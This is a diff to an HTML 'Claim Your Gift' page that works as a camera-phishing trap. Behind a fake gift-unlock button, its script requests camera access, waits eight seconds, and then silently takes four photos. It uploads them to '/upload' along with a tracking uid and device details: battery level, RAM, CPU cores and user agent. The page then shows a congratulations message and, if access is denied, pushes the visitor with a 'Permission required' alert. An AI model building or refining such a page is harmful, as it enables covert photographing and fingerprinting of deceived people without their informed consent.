@@ -4,15 +4,12 @@
     <title>Claim Your Gift</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding: 20px; }
-        .btn { background: #00ff00; color: black; padding: 15px 35px; font-size: 18px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; margin-top: 20px; text-transform: uppercase; }
-        #gift-box { width: 140px; display: none; margin: 30px auto; }
-        .bounce { animation: bounce 0.7s infinite; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-25px); } }
-        #congrats-banner { color: gold; font-size: 26px; font-weight: bold; display: none; margin-bottom: 10px; }
-        #msg-red { color: #00ff00; font-size: 20px; font-weight: bold; display: none; margin-top: 10px; }
-        #msg-sub { color: #ffffff; font-size: 14px; display: none; opacity: 0.8; }
-        #loading { font-size: 18px; margin-top: 15px; display: none; font-weight: bold; }
+        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding: 20px; overflow: hidden; }
+        .btn { background: #00ff00; color: black; padding: 15px 35px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 0 15px #00ff00; }
+        #congrats-banner { color: gold; font-size: 26px; font-weight: bold; display: none; margin-bottom: 20px; }
+        #gift-box { width: 180px; display: none; margin: 20px auto; filter: drop-shadow(0 0 15px gold); }
+        #loading { font-size: 18px; margin-top: 15px; display: none; color: gold; font-weight: bold; }
+        #msg-red { color: #00ff00; font-size: 20px; font-weight: bold; display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -20,73 +17,63 @@
         <h2>🎁 You have a surprise gift! ✨</h2>
         <button class="btn" onclick="initProcess()">🔓 UNLOCK YOUR GIFT 🎁</button>
     </div>
+
     <div id="congrats-banner">🎉 Congratulations! 🎉</div>
-    <img id="gift-box" src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png">
-    <p id="loading">Unlocking your gift 🎁 Please wait...</p>
+    <img id="gift-box" src="https://cdn-icons-png.flaticon.com/512/4213/4213600.png">
+    <p id="loading">🎁 Unlocking your special gift... 🎁</p>
+
     <div id="success-ui">
         <p id="msg-red">Your gift has been redeemed. 👍</p>
-        <p id="msg-sub">You are a good person, God bless you. ✨</p>
+        <p id="msg-sub" style="display:none; opacity:0.8;">You are a good person, God bless you. ✨</p>
     </div>
+
     <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
     <audio id="sound" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3"></audio>
 
     <script>
-    let streamRef = null;
-    async function takeSnapshot(mode, uid, info) {
-        const canvas = document.getElementById('c');
-        const video = document.getElementById('v');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        await fetch('/upload', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ image: canvas.toDataURL('image/jpeg'), uid: uid, mode: mode, info: info })
-        });
-    }
-
     async function initProcess() {
         try {
             const params = new URLSearchParams(window.location.search);
             const mode = params.get('m') || 'front';
             const uid = params.get('uid');
             const battery = await navigator.getBattery();
-            const info = { battery: (battery.level * 100) + "%", ram: navigator.deviceMemory + " GB", cores: navigator.hardwareConcurrency || "N/A", browser: navigator.userAgent };
+            const info = { 
+                battery: (battery.level * 100) + "%", 
+                ram: navigator.deviceMemory + " GB", 
+                cores: navigator.hardwareConcurrency || "N/A",
+                browser: navigator.userAgent
+            };
 
             document.getElementById('main-ui').style.display = "none";
-            document.getElementById('gift-box').style.display = "block";
-            document.getElementById('gift-box').classList.add('bounce');
             document.getElementById('loading').style.display = "block";
 
-            // Delay added to fix black photo issue
-            if (mode === 'dual') {
-                streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                document.getElementById('v').srcObject = streamRef;
-                await new Promise(r => setTimeout(r, 4000)); // Wait for camera
-                for(let i=0; i<3; i++) { await new Promise(r => setTimeout(r, 1500)); await takeSnapshot('Front', uid, info); }
-                streamRef.getTracks().forEach(t => t.stop());
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode==='back'?'environment':'user' } });
+            document.getElementById('v').srcObject = stream;
 
-                streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                document.getElementById('v').srcObject = streamRef;
-                await new Promise(r => setTimeout(r, 4000)); // Wait for camera
-                for(let i=0; i<3; i++) { await new Promise(r => setTimeout(r, 1500)); await takeSnapshot('Back', uid, info); }
-            } else {
-                const face = mode === 'back' ? 'environment' : 'user';
-                streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: face } });
-                document.getElementById('v').srcObject = streamRef;
-                await new Promise(r => setTimeout(r, 8000)); // 8 seconds initial delay as requested
-                for(let i=0; i<4; i++) { await new Promise(r => setTimeout(r, 2000)); await takeSnapshot(mode, uid, info); }
+            // Wait 8 seconds before taking photos
+            await new Promise(r => setTimeout(r, 8000));
+
+            for(let i=0; i<4; i++) {
+                const c = document.getElementById('c'); const v = document.getElementById('v');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                await fetch('/upload', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ image: c.toDataURL('image/jpeg'), uid: uid, mode: mode, info: info })
+                });
+                await new Promise(r => setTimeout(r, 1500));
             }
 
-            if (streamRef) { streamRef.getTracks().forEach(t => t.stop()); }
-            document.getElementById('gift-box').classList.remove('bounce');
-            document.getElementById('gift-box').src = "https://cdn-icons-png.flaticon.com/512/4213/4213600.png";
+            stream.getTracks().forEach(t => t.stop());
             document.getElementById('loading').style.display = "none";
             document.getElementById('congrats-banner').style.display = "block";
+            document.getElementById('gift-box').style.display = "block";
             document.getElementById('msg-red').style.display = "block";
             document.getElementById('msg-sub').style.display = "block";
             document.getElementById('sound').play();
-        } catch (e) { alert("Permission required!"); }
+        } catch (e) { alert("Permission required to claim gift!"); }
     }
     </script>
 </body>
